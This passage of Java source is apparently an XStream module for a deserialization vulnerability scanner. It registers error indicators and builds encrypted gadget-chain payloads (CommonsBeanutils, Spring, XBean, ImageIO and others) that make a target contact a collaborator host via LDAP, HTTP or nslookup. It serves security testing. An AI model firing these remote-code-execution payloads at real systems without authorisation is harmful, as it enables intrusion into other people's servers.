    private final String SPCA_SUFFIX = decrypt("JPliEwFkAYAVsg51SuQAH3zJSVzZj8/DLokk/c4BlMF2bhGhM+dZZtfCNnpdsxUBhyikBssMpfxBIhqjfm0EWqfmff0jarQ+thhPHcjWUevQwN/5joPmk/z5cN9FJhaMmHzQKJoeGxE7aWarTrfeftAubgyXmhZoT9lVd5qEh7bm+w8WzSNR5elySB4QiPQrANlzCxoT9hfGP3vl0canWORv4fKQReBu05nTJJYvlu31SORdUuKdL0700G3Fp4ciKlKxDuzRNUn9M3IOOUB3w5jKUfWqkuaSBhSwpssyx45X/58nd1xGQsbQoHyOKQvYLJYgDDeQmYzXtnWn3LxxnIH2wd/S2OtVvk48SPC8VxAXYlndc+HN+LymuoMFma7nkyTDPupONAmrFZU3oYikxXQD6bE7mSB2qhqzMvhcysdnhKapau9a+/v/a8idKkx9y/BnoRb1RdTpQ827FBil4Az/ALhyvB/ORYUs3jpSKHgvY0I/OyhJZSgXitCc/DF2gxj0t/btBY1/xL+TYOl0TD4Odk5hQA9bOV+F+jdMbYcHIyGehOdYKW59Pg8AyQfokyTDPupONAmrFZU3oYikxXQD6bE7mSB2qhqzMvhcysdnhKapau9a+/v/a8idKkx9gXSgI4Xf6sSSiIiASjrQGRbPqiy8IZRV8a2ucH0HvY7OEB63XKSyRWwPm+vmhJgRwvAGi4z46rDF/zDEZDwToJUzUrpHbc4sPypuLM1TWxHWwrHgyNt9BJWLQ4LfZ691p2k920nj8E9KZfH/a8NGCDoqBtpi75GC/xTaC5w1UHP2YF8FLoau2WImvotWij36lknoR7BNTcBMA8wx43fx8DTTRXj+nL/yIDP+Itpbao5ToFXxbauxVj9M41G0kyFxlvydpKEVJWAyXxA0QHDh6mydKIqIzY1AchGqKodHh+howbqpZlQUhiVcUov+z+1kmpcW9qHLjRcV1Rdz0XTkyxyX+ah46Oi4U5s6BR965ili3gv+kyzRjhXIR+l2c1cKvZJA1YDfZHpCCfKjRVPa1afyPZbtzhKrNvmkPAGIWc7seXsBl0MBWIMdkGxRE8wb");

    //XBean payload data
    private final String XBEAN_PREFIX = decrypt("XRNCTfIQNnmFpvJy1wbeoUi4Ket8pBGkosCN6YjraeR7bIrU8ZLTIVaAGcGaNYx5aLtQt5yoWJu0EPJuNUZFws/MMzMWsMCdkPoeq8C85LR3MIJ9/kekRgnM1S86yrPS2sE5n73EaVBj40hA6bCRlhhWq/bLn+VlK2FDOfvBbXQ5BtC9ehTkS+RvAAi0xuD5F4ovJfPjNk5gs1vQVvFwpR5SSYBUtyePKJVlNcNCdy5clJUoBoguZHXVLUxhNi23hQ6XZsrJJFUH416JJP3R/6gta8sjFWgjkJfW6kUnArs22fZ7kvufhghIgdUDXkc5pNKs3+UHvC9fBzShr8JHc+6CyR/bs1maSKyyESkKkq/KmQvBWwq0JHlLy4vk7RuRlqQaPixje/cMg0dHJXxxKndHvaf5Ra+tzOkqNlQ2BuE=");
    private final String XBEAN_SUFFIX = decrypt("sViLnGUt9EcQdiLjZeQGiNXPx8KNkaUkTAC9di2V7JAHhzszM304/Xl5WPerltL5VGMLV1Pqf/Ov7k2I20jvt0WzLh8PCUTIoa1PPTT3O1I9llobuMKS1hcq8bK+7/o80xDNa8p5P9xXbiY6Q2LLORB8q6Fq5wZRrWDeevR60CG0hn5umhqvSGXTXXGLs1hNeltYfl2KOF+sdK4w7A4lvOF8zVtoi3yUgP0rOMmvWf2qJvKyImrymjclGU49Mw0gLWlDkwkUKVDesrqrGOTve3rBZexb9EdQKOOHaZhxrbHc6q0G7B8GM3RDj9D3iPpgINorGI/hV1DzMdYcFRTOseBrzTNQMyqdStllbMNdFpVK8SreLnDU2K/Ejjk1Gj19QaOIioWYxKq2BYex2yUBqxf9cVtQltSht9DtANchcVvizmTgTeZhO59KxTA8JmXS5yIjw9xRAZeW3InetFNcFdK8dhcGBCzXrvaQht2ybNWaXB1whQ8+NBXPx1EHcI2pPRZiyuOEGs7B73C/yaB0eAl5WDtY1STk5OcrQZX+57jOgCPmsUxekc6upf47c4ZiGq5W3LbjhgZSN7ZPUYM4yhyX+ah46Oi4U5s6BR965ili3gv+kyzRjhXIR+l2c1cKvZJA1YDfZHpCCfKjRVPa1ekbmeA+l07sWDras6z14x5EB/374y3AN2RW0Ezgd7I/+675FUiQjoA8iU4ENmp4IdrBf+BE2Uhg5ywiqg3SG9C+Af9j2wVxTgEdmi0dpFCEANlzCxoT9hfGP3vl0canWHWm3+T94x8vgwaUCKYbRbbe6TowdtpC3KT2G/53wbbpJ3gJ+bhVCqz2JaEC01tWCYgDv4BUyqpHOSv5RkUujfBEB/374y3AN2RW0Ezgd7I/+675FUiQjoA8iU4ENmp4IVBucU07t1SNYJeYIhTlxGcAHwT5Shi6qxqKpcR6W6zdnuZf2NKSNEKxznIq6eADACpcscOi6akTIaacE/GW31v/I4yOjpWEmni1AI4G6QvF28E9hztngWdSOmnWt4j1qQfQ0Q9GQmY4XXTqCByeOmht3jH+0X/6jN9W+nPQHnpkVCatBCdS54RMV9/Iqqbv8SFTgFFo2uVRuoAm64elujsGo8S43lbnMeObv2jBPU0C9M7c4qZgjX3V19ADV6/d+Lqne1ZhDq7LEeNNESq4lz7lA8qV1+xMNfd+FjeIilbM6KMbmHk9N//sdu/CBxsmlGlN5L8sqGj60medc+iYhB3FWAyvFXpsiHtJIbOwM1qZlvydpKEVJWAyXxA0QHDh6mydKIqIzY1AchGqKodHh+howbqpZlQUhiVcUov+z+1kUzie468hiHYAwQwBZZuaxl+5kvK7KoQ5Xx9n+IOmLwQ=");

    protected void initialiseModule() {
        setName("XStream");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Register passive/active scan payloads
        registerPassiveScanIndicator("com.thoughtworks.xstream.io.StreamException", IndicatorTarget.RESPONSE);
        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("exception", Pattern.CASE_INSENSITIVE), Pattern.compile("com\\.thoughtworks\\.xstream\\.")}, IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("<FreddyDeser/>", "com.thoughtworks.xstream.mapper.CannotResolveClassException");

        registerActiveScanCollaboratorPayload(PN_COMBEANUTILS, false);
        registerActiveScanCollaboratorPayload(PN_IMAGEIO, false);
        registerActiveScanCollaboratorPayload(PN_LAZYSEARCH, false);
        registerActiveScanCollaboratorPayload(PN_RESIN, false);
        registerActiveScanCollaboratorPayload(PN_ROME, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGPCA, false);
        registerActiveScanCollaboratorPayload(PN_XBEAN, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_COMBEANUTILS:
                return COMBU_PREFIX + "ldap://" + hostname + "/" + COMBU_SUFFIX;

            case PN_IMAGEIO:
                return IMAGEIO_PREFIX + "<string>nslookup</string><string>" + hostname + "</string>" + IMAGEIO_SUFFIX;

            case PN_LAZYSEARCH:
                return LSE_PREFIX + "http://" + hostname + "/" + LSE_SUFFIX;

            case PN_RESIN:
                return RESIN_PREFIX + "http://" + hostname + "/" + RESIN_SUFFIX;

            case PN_ROME:
                return ROME_PREFIX + "ldap://" + hostname + "/" + ROME_SUFFIX;

            case PN_SPRINGABF:
                return SABF_PREFIX + "ldap://" + hostname + "/" + SABF_MIDDLE + "ldap://" + hostname + "/" + SABF_SUFFIX;

            case PN_SPRINGPCA:
                return SPCA_PREFIX + "ldap://" + hostname + "/" + SPCA_MIDDLE + "ldap://" + hostname + "/" + SPCA_SUFFIX;

            case PN_XBEAN:
                return XBEAN_PREFIX + "http://" + hostname + "/" + XBEAN_SUFFIX;
        }
        return null;
    }
}
